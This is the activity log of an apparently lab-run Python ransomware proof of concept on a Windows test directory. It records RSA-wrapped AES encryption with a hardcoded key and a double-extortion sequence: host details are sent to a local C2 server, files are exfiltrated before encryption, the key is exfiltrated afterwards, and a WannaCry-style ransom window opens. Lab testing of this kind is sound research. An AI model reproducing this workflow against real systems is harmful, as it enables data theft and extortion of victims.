2025-06-25 12:37:15,854 - INFO - ============================================================
2025-06-25 12:37:15,854 - INFO - RANSOMWARE PoC ACTIVITY LOG STARTED
2025-06-25 12:37:15,855 - INFO - ============================================================
2025-06-25 12:37:15,855 - INFO - Log file: logs/ransomware_activity_20250625_123715.log
2025-06-25 12:37:15,856 - INFO - Timestamp: 2025-06-25 12:37:15
2025-06-25 12:37:15,970 - INFO - Platform: Windows 11
2025-06-25 12:37:15,971 - INFO - Python version: 3.13.5 (tags/v3.13.5:6cb20a2, Jun 11 2025, 16:15:46) [MSC v.1943 64 bit (AMD64)]
2025-06-25 12:37:15,971 - INFO - User: mudit
2025-06-25 12:37:15,972 - INFO - Hostname: Mudityadev
2025-06-25 12:37:15,973 - INFO - ============================================================
2025-06-25 12:37:15,973 - INFO - Starting main function
2025-06-25 12:37:15,973 - INFO - Parsing command line arguments
2025-06-25 12:37:15,973 - INFO - Setting up argument parser
2025-06-25 12:37:15,975 - INFO - Parsing command line arguments
2025-06-25 12:37:15,976 - INFO - Arguments parsed - Path: D:\AI-Agent\Ransomware-PoC\testDir, Encrypt: True, Decrypt: False
2025-06-25 12:37:15,976 - INFO - Operation mode: ENCRYPT
2025-06-25 12:37:15,976 - INFO - Target path: D:\AI-Agent\Ransomware-PoC\testDir
2025-06-25 12:37:15,976 - INFO - Using specified path: D:\AI-Agent\Ransomware-PoC\testDir
2025-06-25 12:37:15,976 - INFO - Initializing RSA encryption for AES key
2025-06-25 12:37:16,048 - INFO - AES key encrypted with RSA public key
2025-06-25 12:37:16,049 - INFO - Encrypted key (base64): R2j9VUQThvWSWv0C3nAcDCDki7MZ7/Zil8hfqglF2Dr/Xps6qCq/p31JgZn8cmpw9CHrRcnQFHsezbdnEmNuw7h89evYq+6t6+61RiQsLpziWeWODrKzjgPrYJyWIHxKvHulDmULzrheg9xt16M/nux+F2HdifeToiGNcj+JqHNWbGlp4Vbui9JP8v3vF3H97jQceMyusMXevjo+nIi+SG6S2MLL75x+z7tAKQQHhLTdCnsg9YNXsu4+TxPoRNXWPgJT/1CuW3JFP6NC595tvtaKThC5t8tdLiPbsi3c2vaocSS7tX/fJJqfWT96kWFUMoNdzjVQa6nJLqoK5jBbRg==
2025-06-25 12:37:16,049 - INFO - Using hardcoded AES key for encryption
2025-06-25 12:37:16,049 - INFO - Creating AES cipher with CTR mode
2025-06-25 12:37:16,061 - INFO - Starting file discovery and processing
2025-06-25 12:37:16,061 - INFO - Connecting to C2 server BEFORE encryption to copy clean files
2025-06-25 12:37:16,061 - INFO - Attempting to connect to C2 server: 127.0.0.1:8080
2025-06-25 12:37:16,082 - INFO - Retrieving local IP address
2025-06-25 12:37:16,083 - INFO - Local IP address: 192.168.217.136
2025-06-25 12:37:16,084 - INFO - Successfully sent target directory to C2 server: 127.0.0.1:8080
2025-06-25 12:37:16,085 - INFO - Sent data includes: IP=192.168.217.136, User=mudit, Hostname=Mudityadev, TargetDir=D:\AI-Agent\Ransomware-PoC\testDir
2025-06-25 12:37:16,086 - INFO - C2 server will now copy clean files before encryption begins
2025-06-25 12:37:16,087 - INFO - Waiting for C2 server to complete file exfiltration...
2025-06-25 12:37:18,088 - INFO - Proceeding with file encryption...
2025-06-25 12:37:18,088 - INFO - Processing directory: D:\AI-Agent\Ransomware-PoC\testDir
2025-06-25 12:37:18,089 - INFO - Discovered 0 files in D:\AI-Agent\Ransomware-PoC\testDir
2025-06-25 12:37:18,090 - INFO - Total files processed: 0
2025-06-25 12:37:18,090 - INFO - Starting key exfiltration and GUI launch
2025-06-25 12:37:18,090 - INFO - Attempting to connect to C2 server: 127.0.0.1:8080
2025-06-25 12:37:18,109 - INFO - Retrieving local IP address
2025-06-25 12:37:18,111 - INFO - Local IP address: 192.168.217.136
2025-06-25 12:37:18,111 - INFO - Successfully sent data to C2 server: 127.0.0.1:8080
2025-06-25 12:37:18,112 - INFO - Sent data includes: IP=192.168.217.136, User=mudit, Hostname=Mudityadev, TargetDir=D:\AI-Agent\Ransomware-PoC\testDir
2025-06-25 12:37:18,112 - INFO - Launching WannaCry-style GUI window
2025-06-25 12:37:43,825 - INFO - Received keyboard interrupt, exiting
